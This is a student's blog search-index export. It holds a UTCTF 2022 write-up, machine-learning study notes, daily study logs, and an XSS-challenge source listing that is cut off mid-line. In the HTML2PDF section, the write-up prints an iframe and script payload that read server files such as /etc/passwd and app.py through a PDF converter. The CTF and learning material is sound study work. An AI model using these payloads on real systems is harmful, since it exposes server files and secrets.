<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>UTCTF2022</title>
    <url>/2022/03/14/UTCTF/</url>
    <content><![CDATA[<h1 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h1><p>我承认我这周摸鱼了 因为俄罗斯的游戏免费 2333  周一复现一下</p>
<p><img src="/UTCTF.assets/image-20220314110537531.png" alt="image-20220314110537531"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h3><p>看一下这个什么意思</p>
<blockquote>
<p>Can you hack my website?</p>
<p>By Daniel Parks (@danielp on discord)</p>
<p><a href="http://web1.utctf.live:8651/">http://web1.utctf.live:8651</a></p>
</blockquote>
<p>别的师傅做的</p>
<p>看一下包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/internal/ws</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>Mn6BDybVn/BJ5iCDpZ9JSw==</span><br></pre></td></tr></table></figure>

<p>建立socket连接后 爆破</p>
<p><a href="https://ctftime.org/writeup/32495">CTFtime.org / UTCTF 2022 / Websockets / Writeup</a></p>
<h3 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h3><blockquote>
<p>My friend bet me I couldn’t pwn this site. Can you help me break in?</p>
<p><em>by mattyp</em></p>
<p><a href="http://web2.utctf.live:9854/">http://web2.utctf.live:9854</a></p>
</blockquote>
<p><img src="%5CUTCTF.assets%5Cimage-20220314104424213.png" alt="image-20220314104424213"></p>
<p>打开网站是个这样的页面 点submit后 会直接convert to pdf</p>
<p>可以用 iframe 直接读文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Try Me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/proc/self/cwd/app.py&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf</a></p>
<p>直接拿里面的payload打 就ok</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h3><blockquote>
<p>Just solve 1000 captchas. It’s super easy. By ggu (@ggu on discord)</p>
<p><a href="http://web1.utctf.live:7132/">http://web1.utctf.live:7132</a></p>
</blockquote>
<p>直接按像素提取 不是很出色</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&#x27;http://web1.utctf.live:7132/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">soup = BeautifulSoup(res.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">img_data = soup.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>).split(<span class="string">&quot;,&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">binary_img_data = base64.b64decode(img_data)</span><br><span class="line">file_like = BytesIO(binary_img_data)</span><br><span class="line">image = Image.<span class="built_in">open</span>(file_like)</span><br><span class="line"><span class="comment"># print(image.size)</span></span><br><span class="line"><span class="comment">#尝试者把中间那块直接分割出来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clipper</span>(<span class="params">image</span>):</span><br><span class="line">    img = image</span><br><span class="line">    width, height = img.size</span><br><span class="line">    <span class="comment"># print(width,height)</span></span><br><span class="line">    box = (<span class="number">15</span>,<span class="number">10</span>,<span class="number">410</span>, <span class="number">110</span>)</span><br><span class="line">    <span class="comment"># 前两个坐标点是左上角坐标</span></span><br><span class="line">    <span class="comment"># 后两个坐标点是右下角坐标</span></span><br><span class="line">    <span class="comment"># width在前， height在后</span></span><br><span class="line">    region = img.crop(box)</span><br><span class="line">    <span class="comment"># region.show()</span></span><br><span class="line">    <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">region = Clipper(image)</span><br><span class="line">region.save(<span class="string">&quot;./abab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来提取所有的黄（部分绿）像素点</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">imagepath = <span class="string">r&#x27;./abab.png&#x27;</span></span><br><span class="line">image = cv2.imread(imagepath)</span><br><span class="line">height, width, channel = image.shape</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        b, g, r = image[i, j]</span><br><span class="line">        <span class="keyword">if</span> ((r - b) &gt; <span class="number">210</span> <span class="keyword">and</span> (g - b) &gt; <span class="number">80</span>):  <span class="comment">#这里需要继续调一下</span></span><br><span class="line">            b = <span class="number">0</span></span><br><span class="line">            g = <span class="number">0</span></span><br><span class="line">            r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = <span class="number">255</span></span><br><span class="line">            g = <span class="number">255</span></span><br><span class="line">            r = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">        image[i, j] = [r, g, b]</span><br><span class="line">plt.figure(figsize=(<span class="number">20</span>, <span class="number">10</span>))</span><br><span class="line">plt.imshow(image)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>二值化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./abab.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模式L”为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。</span></span><br><span class="line">Img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">Img.save(<span class="string">&quot;./ab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义灰度界限，大于这个值为黑色，小于这个值为白色</span></span><br><span class="line">threshold = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">        table.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line">photo = Img.point(table, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">photo.save(<span class="string">&quot;./ababab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">photo.show()</span><br></pre></td></tr></table></figure>

<p>一般</p>
<p>我想:</p>
<p>他这个像素值只有固定几种 不知道能不能找出加密算法 emmm</p>
<p>然后去摸鱼了 emmm</p>
<p><a href="https://ctftime.org/writeup/32555">CTFtime.org / UTCTF 2022 / ReReCaptcha / Writeup</a></p>
<p>参考了下别人的wp  主要是在大量图片中提取出现次数最多的像素来获取背景图片 然后xor  gg</p>
<h3 id="Sigma"><a href="#Sigma" class="headerlink" title="Sigma"></a>Sigma</h3><blockquote>
<p>Our new image processing tool runs completely in your browser! Right now we only support one image effect and image format though.</p>
<p>Note: this challenge is also a reversing challenge.</p>
<p>By ggu (@ggu on discord)</p>
<p><a href="http://web2.utctf.live:5006/">http://web2.utctf.live:5006</a></p>
<p><a href="https://utctf.live/files/2382cf3e8bce7c5ae20c7900e44888b5/server.zip?token=eyJ1c2VyX2lkIjo2NCwidGVhbV9pZCI6MzcsImZpbGVfaWQiOjEyfQ.YixQuA.zo685DLvS_VDoKICLHwN_4RyhQo"> server.zip</a></p>
</blockquote>
<p>猫哥yyds</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Attention Model</title>
    <url>/2022/03/09/attention/</url>
    <content><![CDATA[<h1 id="注意力机制学习"><a href="#注意力机制学习" class="headerlink" title="注意力机制学习"></a>注意力机制学习</h1><p>带我的学长发了篇论文给我 让我学一下 Multi-attention 开始动工了~~</p>
<h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><ul>
<li><a href="https://www.bilibili.com/video/BV1Wv411h7kN?p=41">李宏毅机器学习 self-attention</a></li>
<li>读论文 attention is all you need</li>
<li><a href="https://luweikxy.gitbook.io/machine-learning-notes/self-attention-and-transformer">https://luweikxy.gitbook.io/machine-learning-notes/self-attention-and-transformer</a></li>
</ul>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p>​        深度学习里的Attention model其实模拟的是人脑的注意力模型，举个例子来说，当我们观赏一幅画时，虽然我们可以看到整幅画的全貌，但是在我们深入仔细地观察时，其实眼睛聚焦的就只有很小的一块，这个时候人的大脑主要关注在这一小块图案上，也就是说这个时候人脑对整幅图的关注并不是均衡的，是有一定的权重区分的。这就是深度学习里的Attention Model的核心思想。</p>
<p>　　人脑的注意力模型，说到底是一种资源分配模型，在某个特定时刻，你的注意力总是集中在画面中的某个焦点部分，而对其它部分视而不见。</p>
<p>​        注意力模型最近几年在深度学习各个领域被广泛使用，无论是图像处理、语音识别还是<a href="https://so.csdn.net/so/search?q=%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">自然语言处理</a>的各种不同类型的任务中，都很容易遇到注意力模型的身影。所以，了解注意力机制的工作原理对于关注深度学习技术发展的技术人员来说有很大的必要。</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_40027052/article/details/78421155">(32条消息) 深度学习中的注意力机制_CSDN人工智能-CSDN博客_机器学习 注意力机制</a></p>
]]></content>
      <categories>
        <category>ML</category>
      </categories>
      <tags>
        <tag>AM</tag>
      </tags>
  </entry>
  <entry>
    <title>立个flag -- about sec</title>
    <url>/2022/03/11/flag-sec/</url>
    <content><![CDATA[<h1 id="立个flag-–-about-sec"><a href="#立个flag-–-about-sec" class="headerlink" title="立个flag – about sec"></a>立个flag – about sec</h1><p>浏览Twitter的时候看到了 s1ru1us 的blog</p>
<p><a href="https://blog.s1r1us.ninja/home">https://blog.s1r1us.ninja/home</a></p>
<p>看了他关于新的一年的总结 十分有感触</p>
<p>他是一个非常有任性的安全工程师 和他比起来 我所接受的教育无疑是更幸运的的 但他通过自己的努力走出了一条道路 并最后成功</p>
<p>看了他的研究路线很受启发  因为最近在搞AI方面东西 在CTF上花的时间就更少了</p>
<p>我决定专精一方面来弥补 – 所以把研究方向选为 <strong>浏览器安全</strong></p>
<p>我决定在这学期内采纳一些他的学习路线</p>
<ul>
<li>solve every xss challenge on  <a href="https://twitter.com/terjanq">terjang</a>‘s twitter</li>
<li>read every blog <a href="https://blog.s1r1us.ninja/inspiration">https://blog.s1r1us.ninja/inspiration</a></li>
</ul>
<p>这将是一个不小的挑战 在研究AI和维持绩点之余</p>
<p>希望可以走的更远</p>
<p>最后一个flag</p>
<ul>
<li>be the full member of r3kapig</li>
</ul>
]]></content>
      <categories>
        <category>plan</category>
      </categories>
      <tags>
        <tag>goal</tag>
      </tags>
  </entry>
  <entry>
    <title>learn-1</title>
    <url>/2022/03/11/learn-1/</url>
    <content><![CDATA[<h1 id="learn-day1"><a href="#learn-day1" class="headerlink" title="learn-day1"></a>learn-day1</h1><blockquote>
<p>本文为learn365第一篇 记录每日学习内容</p>
</blockquote>
<h2 id="done"><a href="#done" class="headerlink" title="done"></a>done</h2><p><a href="https://github.com/godrun666/team-learning-rl">godrun666/team-learning-rl (github.com)</a></p>
<p>datawhale的开源强化学习学习计划</p>
<p>15day</p>
<ul>
<li>今天开始Task1 目前把书读了 明天把code敲一敲</li>
<li>读了一篇论文的一部分 继续学习 attention</li>
<li>看一个xss （晚上搞   –<a href="https://terjanq.medium.com/how-to-solve-a-challenge-from-intigrity-in-under-60-minutes-6843ba9b9552">How to solve an XSS challenge from Intigriti in under 60 minutes | by terjanq | Medium</a></li>
<li>雅思单词+ted*1</li>
</ul>
<blockquote>
<h6 id="Task1：强化学习基础（2天）"><a href="#Task1：强化学习基础（2天）" class="headerlink" title="Task1：强化学习基础（2天）"></a>Task1：强化学习基础（2天）</h6><ul>
<li>了解强化学习的基本概念；</li>
<li>掌握 Gym 的使用；</li>
<li>对应教程的第一章。</li>
</ul>
</blockquote>
<p>由于要参加datawhale的15day计划 可能强化学习要拖到三月底到四月初来解决了</p>
<h2 id="记录一些杂事"><a href="#记录一些杂事" class="headerlink" title="记录一些杂事"></a>记录一些杂事</h2><ul>
<li>和导师谈了谈 确定了srtp的方向 准备入手了</li>
<li>明天有UTCTF 看看web题目</li>
<li>论文读起来很吃力 要想办法解决</li>
</ul>
]]></content>
      <categories>
        <category>learn365</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>learn2&amp;3</title>
    <url>/2022/03/14/learn2-3/</url>
    <content><![CDATA[<h1 id="learn2-amp-3"><a href="#learn2-amp-3" class="headerlink" title="learn2&amp;3"></a>learn2&amp;3</h1><p>周末没干啥大事 新到了手柄沉迷了一下 (鬼泣5真香)  看了看UTCTF的web</p>
<p>摸鱼 0.0</p>
]]></content>
      <categories>
        <category>learn365</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>learn23</title>
    <url>/2022/04/03/learn23/</url>
    <content><![CDATA[<h1 id="记录一下周末的学习"><a href="#记录一下周末的学习" class="headerlink" title="记录一下周末的学习"></a>记录一下周末的学习</h1><h2 id="midsunctf"><a href="#midsunctf" class="headerlink" title="midsunctf"></a>midsunctf</h2><p>看了一题web 没做出来（失败的我 可恶啊</p>
<h2 id="srtp"><a href="#srtp" class="headerlink" title="srtp"></a>srtp</h2><p>正在立项 讨论ing 希望不会挂</p>
<h2 id="LSTM学习"><a href="#LSTM学习" class="headerlink" title="LSTM学习"></a>LSTM学习</h2><p><a href="http://karpathy.github.io/2015/05/21/rnn-effectiveness/">http://karpathy.github.io/2015/05/21/rnn-effectiveness/</a></p>
<h2 id="kaggle竞赛事件-——-计划下周日前完成学习"><a href="#kaggle竞赛事件-——-计划下周日前完成学习" class="headerlink" title="kaggle竞赛事件  ——  计划下周日前完成学习"></a>kaggle竞赛事件  ——  计划下周日前完成学习</h2><p><a href="https://www.kaggle.com/c/web-traffic-time-series-forecasting">https://www.kaggle.com/c/web-traffic-time-series-forecasting</a></p>
<h2 id="找找英文课听"><a href="#找找英文课听" class="headerlink" title="找找英文课听"></a>找找英文课听</h2><p>为了summer workshop 不会在语言关上被 ko  555 ~</p>
]]></content>
      <categories>
        <category>learn365</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>learn4</title>
    <url>/2022/03/14/learn4/</url>
    <content><![CDATA[<h1 id="learn4"><a href="#learn4" class="headerlink" title="learn4"></a>learn4</h1><p>学习了 GNN 的基本原理</p>
<p>发现宝藏网站</p>
<p><a href="https://distill.pub/">Distill — Latest articles about machine learning</a></p>
<p>好视频</p>
<p><a href="https://www.bilibili.com/video/BV1H44y1t75x?spm_id_from=333.999.0.0">如何读论文【论文精读】_哔哩哔哩_bilibili</a></p>
]]></content>
      <categories>
        <category>ML</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>learn？(忘了)</title>
    <url>/2022/04/02/learn4-2/</url>
    <content><![CDATA[<h1 id="很久没记录了"><a href="#很久没记录了" class="headerlink" title="很久没记录了"></a>很久没记录了</h1><p>最近比较开心的是被nus的 summer workshop 录取了</p>
<p>记录一手周末的学习记录</p>
<h2 id="work1"><a href="#work1" class="headerlink" title="work1"></a>work1</h2><p>先学一手datawhale的异常检测 </p>
<p><a href="https://www.bilibili.com/video/BV1tV411b7Ck">https://www.bilibili.com/video/BV1tV411b7Ck</a></p>
<h3 id="COPOD方法"><a href="#COPOD方法" class="headerlink" title="COPOD方法"></a>COPOD方法</h3><p><a href="https://zhuanlan.zhihu.com/p/338189299">https://zhuanlan.zhihu.com/p/338189299</a></p>
<h2 id="work2"><a href="#work2" class="headerlink" title="work2"></a>work2</h2><p>李宏毅的异常检测部分</p>
]]></content>
      <categories>
        <category>learn365</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>learn6~8</title>
    <url>/2022/03/17/learn6-8/</url>
    <content><![CDATA[<h1 id="learn5-7"><a href="#learn5-7" class="headerlink" title="learn5~7"></a>learn5~7</h1><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p><a href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6</a></p>
<p><a href="https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1">https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1</a></p>
<h2 id="done"><a href="#done" class="headerlink" title="done"></a>done</h2><ul>
<li><p>学会了 auto AI 2333</p>
</li>
<li><p>实践了一丢丢xss</p>
</li>
<li><p>看了部分动手学深度学习</p>
</li>
<li><p>读了点论文</p>
</li>
</ul>
<h2 id="fail-to-do"><a href="#fail-to-do" class="headerlink" title="fail to do"></a>fail to do</h2><p>AST injection 没完全搞明白 。。。失败</p>
<h2 id="plan"><a href="#plan" class="headerlink" title="plan"></a>plan</h2><p>复现俩misc </p>
<p><a href="https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition">https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition</a></p>
<p>集成学习 实践一下</p>
]]></content>
      <categories>
        <category>learn365</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>learn6~8</title>
    <url>/2022/03/17/learn5&amp;6/</url>
    <content><![CDATA[<h1 id="learn5-7"><a href="#learn5-7" class="headerlink" title="learn5~7"></a>learn5~7</h1><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p><a href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6</a></p>
<p><a href="https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1">https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1</a></p>
<h2 id="done"><a href="#done" class="headerlink" title="done"></a>done</h2><ul>
<li><p>实践了一丢丢xss</p>
</li>
<li><p>看了部分动手学深度学习</p>
</li>
<li><p>读了点论文</p>
</li>
</ul>
<h2 id="fail-to-do"><a href="#fail-to-do" class="headerlink" title="fail to do"></a>fail to do</h2><p>AST injection 没完全搞明白 。。。失败</p>
<h2 id="plan"><a href="#plan" class="headerlink" title="plan"></a>plan</h2><p>复现俩python misc</p>
<p><a href="https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition">https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition</a></p>
]]></content>
      <categories>
        <category>learn365</category>
      </categories>
      <tags>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title>one-xss-challenge</title>
    <url>/2022/03/11/one-xss-challenge/</url>
    <content><![CDATA[<h1 id="一个xss挑战"><a href="#一个xss挑战" class="headerlink" title="一个xss挑战"></a>一个xss挑战</h1><h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>直接访问 ./passenge  看下源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> unsafeCharacters = [<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;+&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    str += <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> unsafeCharacters) &#123;</span><br><span class="line">        str = str.<span class="title function_">replaceAll</span>(char, <span class="string">`&amp;#x<span class="subst">$&#123;char.codePointAt().toString(<span class="number">0x10</span>)&#125;</span>;`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showMessage</span>(<span class="params">title = <span class="string">&quot;&quot;</span>, message = <span class="string">&quot;&quot;</span>, button = &#123;</span></span><br><span class="line"><span class="params">    text: <span class="string">&quot;Close&quot;</span>,</span></span><br><span class="line"><span class="params">    action: <span class="string">&quot;this.parentElement.parentElement.parentElement.remove();&quot;</span>,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> elem = (<span class="keyword">new</span> <span class="title class_">Range</span>).<span class="title function_">createContextualFragment</span>(<span class="string">`</span></span><br><span class="line"><span class="string">		&lt;div class=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">			&lt;div class=&quot;alert-inner&quot;&gt;</span></span><br><span class="line"><span class="string">				&lt;div class=&quot;page-bar&quot;&gt;</span></span><br><span class="line"><span class="string">					&lt;h3&gt;<span class="subst">$&#123;sanitize(title)&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">					&lt;button onclick=&quot;<span class="subst">$&#123;sanitize(button.action)&#125;</span>&quot;&gt;<span class="subst">$&#123;sanitize(button.text)&#125;</span>&lt;/button&gt;</span></span><br><span class="line"><span class="string">				&lt;/div&gt;</span></span><br><span class="line"><span class="string">				&lt;div class=&quot;page-content&quot;&gt;</span></span><br><span class="line"><span class="string">					<span class="subst">$&#123;sanitize(message)&#125;</span></span></span><br><span class="line"><span class="string">				&lt;/div&gt;</span></span><br><span class="line"><span class="string">			&lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	`</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(elem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> inputFields = &#123;</span><br><span class="line">    <span class="attr">passwordLength</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password-length&quot;</span>),</span><br><span class="line">    <span class="attr">allowNumbers</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;allow-numbers&quot;</span>),</span><br><span class="line">    <span class="attr">allowSymbols</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;allow-symbols&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> generating = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (generating) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(<span class="function"><span class="params">_</span> =&gt;</span> (generating = <span class="literal">false</span>));</span><br><span class="line">    generating = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> passwordLength = inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> json = <span class="string">`&#123; &quot;passwordLength&quot;: <span class="subst">$&#123;passwordLength&#125;</span>, &quot;seed&quot;: <span class="subst">$&#123;crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">1</span>))[<span class="number">0</span>]&#125;</span>, &quot;allowNumbers&quot;: <span class="subst">$&#123;inputFields.allowNumbers.checked&#125;</span>, &quot;allowSymbols&quot;: <span class="subst">$&#123;inputFields.allowSymbols.checked&#125;</span> &#125;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(passwordLength = passwordLength.<span class="title function_">match</span>(<span class="regexp">/^\d+$/gm</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">showMessage</span>(<span class="string">&quot;Error&quot;</span>, <span class="string">&quot;Password Length must be a number.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    passwordLength = <span class="title class_">Number</span>(passwordLength[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> wasm = <span class="keyword">await</span> <span class="title class_">WebAssembly</span>.<span class="title function_">instantiateStreaming</span>(<span class="title function_">fetch</span>(<span class="string">&quot;program.wasm&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">env</span>: &#123;</span><br><span class="line">            <span class="attr">log_str</span>: <span class="function"><span class="params">idx</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> (u8[idx] != <span class="number">0</span>) &#123;</span><br><span class="line">                    str += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[idx]);</span><br><span class="line">                    ++idx;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">log_int</span>: <span class="variable language_">console</span>.<span class="property">log</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> u8 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="property">memory</span>.<span class="property">buffer</span>);</span><br><span class="line">    <span class="keyword">let</span> options = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(json.<span class="property">length</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> password = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(<span class="title class_">Number</span>(passwordLength) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span 